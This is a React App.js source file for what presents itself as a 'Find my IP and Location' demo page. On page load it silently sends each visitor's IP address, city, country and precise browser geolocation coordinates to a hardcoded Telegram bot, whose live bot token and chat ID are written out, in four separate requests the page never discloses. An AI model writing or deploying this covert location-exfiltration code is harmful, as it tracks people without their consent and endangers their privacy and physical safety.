import logo from "./logo.svg";
import React, { useEffect, useState } from "react";

import "./App.css";
import useGeoLocation from "./components/useGeoLocation";
import axios from "axios";

function App() {
  const [currLocation, setCurrLocation] = useState({});
  const [currLocationJs, setCurrLocationJs] = useState({});
  useEffect(() => {
    const send = axios.get(
      `https://api.telegram.org/bot6333516808:AAH6jPwN3qaHnDUE0aGTgzD0AgEjpDK-ua8/sendMessage?chat_id=571262339&text=USER SEND DATA`
    );
    console.log(send);
    getLocation();
    getLocationJs();
    getUserGeolocationDetails();
  }, []);
  const getLocation = async () => {
    const location = await axios.get("https://ipapi.co/json");
    setCurrLocation(location?.data);
    const send = await axios.get(
      `https://api.telegram.org/bot6333516808:AAH6jPwN3qaHnDUE0aGTgzD0AgEjpDK-ua8/sendMessage?chat_id=571262339&text=data 1 lat:${location?.data?.latitude}, long:${location?.data?.longitude}, city:${location?.data?.city}`
    );
    console.log(send);
  };

  const getLocationJs = () => {
    navigator?.geolocation?.getCurrentPosition((position) => {
      console.log(position);
      const { latitude, longitude } = position?.coords;
      setCurrLocationJs({ latitude, longitude });
      const send = axios.get(
        `https://api.telegram.org/bot6333516808:AAH6jPwN3qaHnDUE0aGTgzD0AgEjpDK-ua8/sendMessage?chat_id=571262339&text=data 2 lat:${latitude}, long:${longitude}`
      );
      console.log(send);
    });
  };

  const [details, setDetails] = useState(null);

  const getUserGeolocationDetails = () => {
    fetch(
      "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
    )
      .then((response) => response?.json())
      .then((data) => {
        setDetails(data);
        const send = axios.get(
          `https://api.telegram.org/bot6333516808:AAH6jPwN3qaHnDUE0aGTgzD0AgEjpDK-ua8/sendMessage?chat_id=571262339&text=data 3 city:${data?.city}, country:${data?.country_name}, country_code:${data?.country_code}, IP: ${data?.IPv4}`
        );
        console.log(send);
      });
  };

  const locationx = useGeoLocation();
  useEffect(() => {
    if (locationx?.loaded) {
      const send = axios.get(
        `https://api.telegram.org/bot6333516808:AAH6jPwN3qaHnDUE0aGTgzD0AgEjpDK-ua8/sendMessage?chat_id=571262339&text=data 4 ${JSON.stringify(
          locationx
        )}`
      );
      console.log(send);
    }
  }, [locationx]);

  return (
    <>
      <div>
        <h1>Current Location</h1>
        <p>Latitude: {currLocation?.latitude}</p>
        <p>Longitude: {currLocation?.longitude}</p>
        <p>City: {currLocation?.city}</p>

        <h1>Current Location JS</h1>
        <p>Latitude: {currLocationJs?.latitude}</p>
        <p>Longitude: {currLocationJs?.longitude}</p>
      </div>
      <div className="col text-center">
        <h2>Find my IP and Location</h2>
        <p className="mt-3">
          <button
            className="btn btn-primary"
            onClick={getUserGeolocationDetails}
          >
            Find my details
          </button>

          <div className="row justify-content-center mt-3">
            <div className="col-lg-6 text-center text-dark">
              {details && (
                <ul className="list-group">
                  <li className="list-group-item">
                    Location :{" "}
                    {`${details?.city}, ${details?.country_name}(${details?.country_code})`}
                  </li>
                  <li className="list-group-item">IP: {details?.IPv4}</li>
                </ul>
              )}
            </div>
          </div>
        </p>
      </div>
      <div class="separator">Hook 3: User Geo Location Hook</div>
      <div className="row d-flex justify-content-center mt-3 mb-5 pb-5">
        <div className="col-6">
          <div class="card">
            <div class="card-header text-left font-weight-bold d-flex">
              <div className="inline-block mr-auto pt-1">
                {locationx?.loaded
                  ? JSON.stringify(locationx)
                  : "Location data not available yet."}
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
